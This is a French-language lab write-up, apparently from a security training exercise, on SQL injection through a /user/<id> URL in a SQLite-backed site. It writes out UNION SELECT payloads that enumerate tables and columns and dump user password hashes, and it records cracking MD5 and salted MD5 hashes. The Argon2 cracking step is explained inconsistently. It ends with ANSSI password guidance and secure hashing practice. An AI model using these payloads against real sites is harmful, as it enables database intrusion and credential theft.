- Repérer les information utiles pour trouver un point d'entré.
    - Dans l'exercice :
        - la liste des utilisateurs comporte admin
            - puis les articles crée par celui-ci nous donne des infos sur la longueur des mot de passe, le type de systeme de base de données


- Ensuite, rechercher une url n'étant pas protégé
    - Dans l'exercice :
        - l'url /user/1 = /user/<id>
        Ici si l'on écrit /user/2-1 la requête est interprétée, mais cela signifie que la requête n'est pas protégée.

- Ensuite, rechercher le nom des tables présentes dans la base de données
    - Dans l'exercice :
        - à la place de /user/1
        - on va écrire : -1 union select 1,2,3,4,5,6 from sqlite_schema
            - -1 signifie juste que l'affiche va être mis en premier (changer l'order by de la requête principale)
            - union signifie que le résultat de la requête caché du back va être jointe à la requête passée dans l'url
                - WARNING : les nombres de colonnes de la partie droite de UNION doivent correspondre au nombre de colonnes de la partie gauche afin d'obtenir un résultat
            - sqlite_schema va retourner le nom des tables présentes dans la base de données
                - WARNING : Il se peut qu'il faille changer des valeurs dans le select de la partie de droite selon le type de colonne du résultat de la première requête
            - Pour l'exercice, il faudra taper :
                - /-1 union select 1,"admin",3,name,"test",6 from sqlite_schema
            - La liste des tables est la suivante :
                - _sqlx_migrations
                - messages
                - sqlite_autoindex__sqlx_migrations_1
                - tags
                - users

- Celle qui nous intéresse est la table : users
- Du coup, nous devons récupérer le nom des colonnes présentes dans la table users
    - Pour cela il faut taper :
        - -1 union select 1,"admin",3,name,"password",6 from pragma_table_info('users')
    - Liste des colonnes de la table users :
        - id
        - name
        - password
**************************************************************************************
Ensuite, lister les mot de passe des différents utilisateurs :
    - Dans l'exercice :
        - On va taper : -1 union select 1,"admin",3,name,password,6 from users
    - Liste des mots de passe récupérer :
        - admin | 6001  // nico_le_BG_du_38 | 6002 // hamtaro_le_ouf_guedin | 6003 // diane_la_belle_gosse | 6004 // rodin | 6005
- Essayons d'afficher les mot de passe avec la dernière requête utilisé dans la partie précédente :
    - -1 union select 1,"admin",3,name,password,6 from users
- Cette fois nous récupérons des mots de passe qui ne sont pas en clair
    - Liste des mots de passe récupérés :

        - admin | 14b85b0752eddc5f25217386e3c6bf22
        - nico_le_BG_du_38 | 315b4df935f4775ef5033a4833a9e0e1
        - hamtaro_le_ouf_guedin | c1f75cc0f7fe269dd0fd9bd5e24f9586
        - diane_la_belle_gosse | decc2e06a44e61f12a030bc4951563eb
        - rodin | 281715cafa675bf359ebaa42cb44fa17

- Utilisation d'un outil pour récupérer le mot de passe en clair par rapport au hash récupérés précédemment : https://hashes.com/en/decrypt/hash
- Algorythme utilisé : MD5
    - Particularité du MD5 -> 128 bites -> 32 caractères

- Liste des mots de passe après "décryptage" :

    - admin | 14b85b0752eddc5f25217386e3c6bf22 | 7002
    - nico_le_BG_du_38 | 315b4df935f4775ef5033a4833a9e0e1 | 7004
    - hamtaro_le_ouf_guedin | c1f75cc0f7fe269dd0fd9bd5e24f9586 | 7006
    - diane_la_belle_gosse | decc2e06a44e61f12a030bc4951563eb | 7008
    - rodin | 281715cafa675bf359ebaa42cb44fa17 | 7010
******************************************************************************************
- Essayons d'afficher les mot de passe avec la dernière requête utilisé dans la partie précédente :
  - -1 union select 1,"admin",3,name,password,6 from users

- Cette fois encore, nous récupérons des mots de passe qui ne sont pas en clair
    - Liste des mots de passe récupérés :

        - admin | dd549ef722ec71867ebb30e94a5026e7$xu9ykorscfkgsbb3
        - nico_le_BG_du_38 | 3a44d354d54c58e822d6ba0c9c978b98$yz6ysnfltr9ovnjz
        - hamtaro_le_ouf_guedin | 6104326c2a4f7ed0187db532e131be09$gqybhtkoms4gxghs
        - diane_la_belle_gosse | cea7ea947b7e477b7a76cd0927a8e8dd$q7uawzmzgq7r991v
        - rodin | 387d8278d29a3f8db6d888879a4abe76$x9xwqtylwdrnqo4v

- Utilisation d'un script python pour récupérer le mot de passe en clair par rapport au hash + salt récupérés précédemment : MD5SaltedCracker.py
- Algorythme utilisé :
    - Particularité du MD5 -> 128 bites -> 32 caractères + un sel avec le séparateur $


- Liste des mots de passe après "décryptage" :

    - admin | dd549ef722ec71867ebb30e94a5026e7$xu9ykorscfkgsbb3 | 8003
    - nico_le_BG_du_38 | 3a44d354d54c58e822d6ba0c9c978b98$yz6ysnfltr9ovnjz | 8006
    - hamtaro_le_ouf_guedin | 6104326c2a4f7ed0187db532e131be09$gqybhtkoms4gxghs | 8009
    - diane_la_belle_gosse | cea7ea947b7e477b7a76cd0927a8e8dd$q7uawzmzgq7r991v | 8012
    - rodin | 387d8278d29a3f8db6d888879a4abe76$x9xwqtylwdrnqo4v | 8015
***************************************************************************************
- Essayons d'afficher les mot de passe avec la dernière requête utilisé dans la partie précédente :
  - -1 union select 1,"admin",3,name,password,6 from users

- Cette fois encore, nous récupérons des mots de passe qui ne sont pas en clair
    - Liste des mots de passe récupérés :

        - admin | $argon2id$v=19$m=4096,t=3,p=1$c4ca4238a0b92382$ZaXiFUMYfTbo28cDBpd5hbes2MqFC/PuX2obtmXwFAI
        - nico_le_BG_du_38 | $argon2id$v=19$m=4096,t=3,p=1$c81e728d9d4c2f63$3A5SH32PJy/6wiCX/VV1x+wPydXdy1ifKs4HQjdzxQU
        - hamtaro_le_ouf_guedin | $argon2id$v=19$m=4096,t=3,p=1$eccbc87e4b5ce2fe$OpO0MbNtrEcAtmvwOZpwFAR6ZE4QXMgagNYLUSH65qo
        - diane_la_belle_gosse | $argon2id$v=19$m=4096,t=3,p=1$a87ff679a2f3e71d$DK3JhvXBaVXBOMWNg26wTSyzGuwoiw0QWdWTMOUrI0Y
        - rodin | $argon2id$v=19$m=4096,t=3,p=1$e4da3b7fbbce2345$NfR/nD1qBZ2iizGcdeutAN7cJB5rkzT/VqgGDAAy8z4

- Utilisation d'un script python pour récupérer le mot de passe en clair par rapport au hash récupérés précédemment : MD5SaltedCracker.py
- Algorythme utilisé : Argon

- Liste des mots de passe après "décryptage" :

    - admin | $argon2id$v=19$m=4096,t=3,p=1$c4ca4238a0b92382$ZaXiFUMYfTbo28cDBpd5hbes2MqFC/PuX2obtmXwFAI | 9005
    - nico_le_BG_du_38 | $argon2id$v=19$m=4096,t=3,p=1$c81e728d9d4c2f63$3A5SH32PJy/6wiCX/VV1x+wPydXdy1ifKs4HQjdzxQU | 9010
    - hamtaro_le_ouf_guedin | $argon2id$v=19$m=4096,t=3,p=1$eccbc87e4b5ce2fe$OpO0MbNtrEcAtmvwOZpwFAR6ZE4QXMgagNYLUSH65qo | 9015
    - diane_la_belle_gosse | $argon2id$v=19$m=4096,t=3,p=1$a87ff679a2f3e71d$DK3JhvXBaVXBOMWNg26wTSyzGuwoiw0QWdWTMOUrI0Y | 9020
    - rodin | $argon2id$v=19$m=4096,t=3,p=1$e4da3b7fbbce2345$NfR/nD1qBZ2iizGcdeutAN7cJB5rkzT/VqgGDAAy8z4 | 9025
/*********************************************************************************
- Après avoir parcouru le site officiel de l'ANSSI :

- Voici les recommandations pour le choix d'un mot de passe retenue :

    - Longueur du mot de passe : Les mots de passe doivent être d'une longueur minimale de 12 caractères. Plus le mot de passe est long, plus il est difficile à pirater.

    - Complexité : Un bon mot de passe devrait inclure une combinaison de lettres majuscules et minuscules, de chiffres et de caractères spéciaux. Évitez d'utiliser des mots courants, des phrases évidentes ou des combinaisons comme "123456" ou "motdepasse".

    - Variété : Évitez d'utiliser le même mot de passe pour plusieurs comptes en ligne. Utilisez des mots de passe uniques pour chaque service ou site web que vous utilisez.

    - Mots de passe mémorables : Créez un mot de passe qui vous est facile à mémoriser, mais difficile à deviner pour les autres. Vous pouvez utiliser des phrases mnémotechniques ou des combinaisons de mots qui n'ont pas de sens pour les autres.

    - Mises à jour régulières : Changez vos mots de passe régulièrement, au moins tous les trois mois, surtout pour les comptes sensibles comme celui de votre banque ou de votre messagerie électronique.

    - Authentification à deux facteurs (2FA) : L'ANSSI recommande l'utilisation de l'authentification à deux facteurs lorsque cela est possible. Cela ajoute une couche de sécurité en plus du mot de passe en demandant une vérification supplémentaire, comme un code envoyé sur votre téléphone mobile.

    - Vérification de la sécurité des mots de passe : Utilisez des outils en ligne ou des gestionnaires de mots de passe pour évaluer la force de votre mot de passe. Ces outils peuvent vous indiquer si votre mot de passe est suffisamment fort ou s'il est déjà compromis.

- Il est important de noter que les recommandations en matière de sécurité évoluent avec le temps en réponse aux nouvelles menaces et vulnérabilités. Par conséquent, je vous conseille de consulter le site officiel de l'ANSSI ou d'autres sources fiables pour obtenir les dernières directives sur la création de mots de passe sécurisés.
***************************************************************************
les bonne pratique
 Utilisez des algorithmes de hachage forts : Ne stockez jamais les mots de passe en texte brut. Utilisez des algorithmes de hachage forts comme bcrypt, Argon2 ou scrypt pour hasher les mots de passe. Ces algorithmes sont conçus pour être lents et coûteux en ressources, rendant difficile pour les attaquants de retrouver le mot de passe d'origine à partir du hachage.

- Utilisez un sel (salt) : Un sel est une valeur aléatoire unique associée à chaque mot de passe avant le hachage. Le sel garantit que deux utilisateurs avec le même mot de passe auront des hachages différents en raison de l'utilisation de sels différents. Cela rend plus difficile l'utilisation d'attaques par tables arc-en-ciel (rainbow tables) pour retrouver les mots de passe.

- Utilisez des itérations : Les algorithmes de hachage comme bcrypt permettent de spécifier le nombre d'itérations du processus de hachage. Plus le nombre d'itérations est élevé, plus le hachage est sécurisé. Cependant, cela peut augmenter le temps de calcul, ce qui est une bonne chose du point de vue de la sécurité.

- Évitez l'invention maison : Ne créez pas votre propre algorithme de hachage ou de chiffrement. Utilisez des bibliothèques et des fonctions cryptographiques standard fournies par des experts en sécurité.

- Effectuez la validation côté serveur : Ne faites pas confiance aux données envoyées par les utilisateurs. Assurez-vous de valider et de hacher les mots de passe côté serveur, et ne stockez jamais de mots de passe en texte brut côté client ou dans des cookies.

- Mettez en place une politique de mots de passe forte : Encouragez les utilisateurs à choisir des mots de passe forts en imposant des critères tels que la longueur minimale, l'utilisation de lettres majuscules et minuscules, de chiffres et de caractères spéciaux.

- Surveillez et répondez aux menaces : Mettez en place des mécanismes de surveillance pour détecter les tentatives d'accès non autorisées à votre base de données. En cas d'incident, répondez rapidement en réinitialisant les mots de passe compromis et en enquêtant sur l'incident.

- Formez les développeurs et le personnel : Assurez-vous que les développeurs et le personnel impliqués dans le développement et la gestion du système comprennent les bonnes pratiques en matière de sécurité des mots de passe et sont conscients des risques liés aux faiblesses de sécurité.
